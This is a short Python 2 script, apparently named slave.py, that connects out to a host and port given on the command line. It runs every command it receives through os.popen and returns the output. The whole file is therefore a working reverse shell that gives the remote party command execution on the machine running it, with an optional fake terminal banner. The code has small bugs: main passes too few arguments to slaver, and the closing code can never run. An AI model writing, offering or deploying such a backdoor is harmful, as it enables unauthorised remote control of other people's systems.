#!/usr/bin/env python

import socket
import os
import sys
import time
import threading

def recvuntil(p, target):
    data = ""
    while target not in data:
        data += p.recv(1)
    return data

def recvall(socket_fd):
    data = ""
    size = 0x10
    while True:
        r = socket_fd.recv(size)
        data += r
        if len(r) < size:
            break
    return data


def slaver(host, port, fake):
    slaver_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    slaver_fd.connect((host, port))
    banner = "[FakeTerminal] >> "
    while True:
        command = recvuntil(slaver_fd, "\n")
        if fake:
            slaver_fd.send(banner)
        # print "[+] Executing : %r" % (command)
        try:
            result = os.popen(command).read()
        except:
            result = ""
        slaver_fd.send(command + result)
    print "[+] Closing connection..."
    slaver_fd.shutdown(socket.SHUT_RDWR)
    slaver_fd.close()

def main():
    if len(sys.argv) != 3:
        print "Usage : "
        print "\tpython slave.py [HOST] [PORT]"
        exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    slaver(host, port)

if __name__ == "__main__":
    main()
